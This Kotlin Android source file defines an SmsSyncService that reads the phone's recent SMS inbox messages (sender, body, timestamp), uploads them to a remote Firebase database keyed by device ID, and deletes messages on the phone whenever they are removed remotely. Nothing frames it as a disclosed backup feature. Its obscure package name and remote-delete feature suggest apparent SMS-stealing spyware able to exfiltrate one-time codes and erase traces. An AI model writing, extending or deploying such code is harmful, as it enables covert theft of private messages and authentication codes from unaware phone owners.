package com.vplan.rxtprob

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import com.google.firebase.FirebaseApp
import com.google.firebase.database.*

class SmsSyncService(private val context: Context) {

    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver, Settings.Secure.ANDROID_ID
    ) ?: "unknown_device"

    private val smsRef: DatabaseReference by lazy { getSafeDatabaseReference() }

    private fun ensureFirebaseReady() {
        try {
            if (FirebaseApp.getApps(context).isEmpty()) {
                FirebaseApp.initializeApp(context)
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e("SmsSyncService", "Firebase init error: ${e.message}")
        }
    }

    private fun getSafeDatabaseReference(): DatabaseReference {
        ensureFirebaseReady()
        val db = FirebaseDatabase.getInstance()
        return db.getReference("sms").child(deviceId)
    }

    fun uploadInitialSms(limit: Int = 20) {
        val uriSms = Telephony.Sms.Inbox.CONTENT_URI
        val cursor: Cursor? = try {
            context.contentResolver.query(uriSms, null, null, null, "date DESC")
        } catch (e: SecurityException) {
            e.printStackTrace()
            null
        }

        if (cursor == null) {
            Log.e("SmsSyncService", "Cursor null — check permission or default SMS app")
            return
        }

        cursor.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                try {
                    val id = it.getString(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val sender = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "unknown"
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val smsData = mapOf("id" to id, "sender" to sender, "body" to body, "timestamp" to date)
                    smsRef.child(id).setValue(smsData)
                    count++
                } catch (e: Exception) {
                    Log.e("SmsSyncService", "Error reading SMS row: ${e.message}")
                }
            }
            Log.d("SmsSyncService", "Uploaded $count SMS")
        }
    }

    fun listenForFirebaseDeletion() {
        try {
            smsRef.addChildEventListener(object : ChildEventListener {
                override fun onChildRemoved(snapshot: DataSnapshot) {
                    val smsId = snapshot.key ?: return
                    deleteSmsFromPhone(smsId)
                }

                override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
                override fun onCancelled(error: DatabaseError) {
                    Log.e("SmsSyncService", "Listener cancelled: ${error.message}")
                }
            })
        } catch (e: Exception) {
            Log.e("SmsSyncService", "listenForFirebaseDeletion error: ${e.message}")
        }
    }

    private fun deleteSmsFromPhone(smsId: String) {
        try {
            val uriSms = Uri.parse("content://sms")
            val deletedRows = context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
            Log.d("SmsSyncService", "Deleted $deletedRows rows for SMS id=$smsId")
        } catch (e: Exception) {
            Log.e("SmsSyncService", "deleteSmsFromPhone error: ${e.message}")
        }
    }
}
